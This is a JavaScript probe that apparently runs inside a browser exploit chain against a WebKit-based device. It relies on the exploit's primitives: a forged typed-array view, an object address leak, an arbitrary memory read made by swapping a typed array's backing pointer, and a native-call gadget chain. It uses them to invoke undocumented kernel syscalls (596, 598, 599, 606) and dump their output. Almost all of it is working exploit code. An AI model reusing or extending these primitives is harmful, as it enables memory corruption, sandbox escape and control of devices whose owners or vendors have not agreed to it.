// Always-succeeds query sweep: 596/599/606 all return ret 0 with zero
// args and no copyout. This probe gives each one a proper output buffer
// with position-encoded fill + guard, sweeping 4 arg shapes per syscall
// to find their data channel. Also re-runs 598 for a fresh root pointer.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys596 !== "number" ||
      typeof native.wrappers.sys598 !== "number" ||
      typeof native.wrappers.sys599 !== "number" ||
      typeof native.wrappers.sys606 !== "number")
    throw new Error("chain_or_wrappers_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function toHex(bytes, cap) {
    var limit = Math.min(bytes.length, cap || 64);
    var out = "";
    for (var i = 0; i < limit; i++)
      out += ("0" + bytes[i].toString(16)).slice(-2);
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("query_preflight");
  // Shared buffers
  var bufOff = 0x200, bufLen = 0x100;
  var bufAddr = plan.addresses.frame + bufOff;
  var sizePtrOff = 0x1400;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  function armBuf(fill) {
    if (fill) {
      for (var i = 0; i < bufLen; i++)
        plan.frame[bufOff + i] = (i * 7 + 3) & 255;
    } else {
      plan.frame.fill(0, bufOff, bufOff + bufLen);
    }
  }
  function diffBuf(fill) {
    var first = -1, last = -1;
    for (var i = 0; i < bufLen; i++) {
      var expected = fill ? ((i * 7 + 3) & 255) : 0;
      if (plan.frame[bufOff + i] !== expected) {
        if (first === -1) first = i;
        last = i;
      }
    }
    var hex = "";
    if (first !== -1) {
      var dumpLen = Math.min(48, last - first + 1);
      for (var d = 0; d < dumpLen; d++)
        hex += ("0" + plan.frame[bufOff + first + d]
          .toString(16)).slice(-2);
    }
    return { first: first, last: last,
      extent: (first === -1) ? 0 : last - first + 1, hex: hex };
  }
  // Targets: [wrapper_name, label]
  var targets = [
    { name: "sys596", label: "596" },
    { name: "sys599", label: "599" },
    { name: "sys606", label: "606" }
  ];
  // Also re-run 598 for fresh root pointer
  targets.push({ name: "sys598", label: "598" });
  var results = [];
  var rootBase = "unknown";
  for (var t = 0; t < targets.length; t++) {
    var tgt = targets[t];
    phase = tgt.label;
    var shapes = [
      { label: "z", args: [0, 0, 0, 0, 0, 0], arm: false },
      { label: "b", args: [bufAddr, bufLen, 0, 0, 0, 0], arm: true },
      { label: "bp", args: [bufAddr, sizeAddr, 0, 0, 0, 0], arm: true }
    ];
    for (var s = 0; s < shapes.length; s++) {
      var sh = shapes[s];
      if (sh.arm) {
        plan.frame.fill(0, bufOff, bufOff + bufLen);
        putSize();
      }
      function putSize() {
        fv2.setUint32(sizePtrOff, 0x1000, true);
        fv2.setUint32(sizePtrOff + 4, 0, true);
      }
      var fv2 = new DataView(plan.frame.buffer);
      fv2.setUint32(sizePtrOff, 0x1000, true);
      fv2.setUint32(sizePtrOff + 4, 0, true);
      var call = native.call(tgt.name, sh.args);
      var errno = (call.value === -1) ? native.readErrno() : null;
      var hex = hexAt(bufOff, 48);
      results.push(tgt.label + "." + sh.label + ":ret" + call.value +
        "/e" + (errno === null ? "ok" : errno) + "/" + hex);
    }
  }
  function hexAt(offset, count) {
    var out = "";
    for (var i = 0; i < count; i++)
      out += ("0" + plan.frame[offset + i].toString(16)).slice(-2);
    return out;
  }
  mark("query_sweep_done");
  var after = native.call("getpid", []);
  result = { id: "query_sweep_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { results: results.join(" | ").slice(0, 512),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "query_sweep_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
